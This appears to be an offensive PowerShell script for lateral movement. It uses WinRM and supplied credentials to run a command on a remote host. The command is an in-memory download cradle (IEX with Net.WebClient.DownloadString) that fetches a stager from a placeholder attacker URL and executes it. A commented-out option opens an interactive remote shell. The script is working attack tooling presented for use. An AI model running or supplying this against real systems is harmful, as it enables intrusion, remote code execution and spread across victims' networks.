# =============================================================================
# WinRM / PSRemoting lateral movement
# Runs a command (PowerShell stager) on a remote host over WinRM.
#
# Requirements: WinRM enabled on the target (or admin creds to enable it):
#   Enable-PSRemoting -Force
#
# Usage:
#   $cred = Get-Credential
#   .\winrm-psremoting.ps1 -Computer TARGET -Credential $cred -StagerUrl http://<IP>/run.ps1
# =============================================================================

param(
    [Parameter(Mandatory = $true)][string]$Computer,
    [Parameter(Mandatory = $true)][System.Management.Automation.PSCredential]$Credential,
    [Parameter(Mandatory = $false)][string]$StagerUrl = "http://<IP>/run.ps1"
)

# ── Build the stager cradle ──────────────────────────────────────────────────
# The remote command downloads and runs your PowerShell stager in memory.
$cmd = "IEX(New-Object Net.WebClient).DownloadString('$StagerUrl')"

# ── One-shot execution ─────────────────────────────────────────────────────
Invoke-Command -ComputerName $Computer -Credential $Credential -ScriptBlock {
    param($c)
    Invoke-Expression $c
} -ArgumentList $cmd

# ── Interactive session (uncomment to drop into a remote shell) ────────────
# $s = New-PSSession -ComputerName $Computer -Credential $Credential
# Enter-PSSession $s
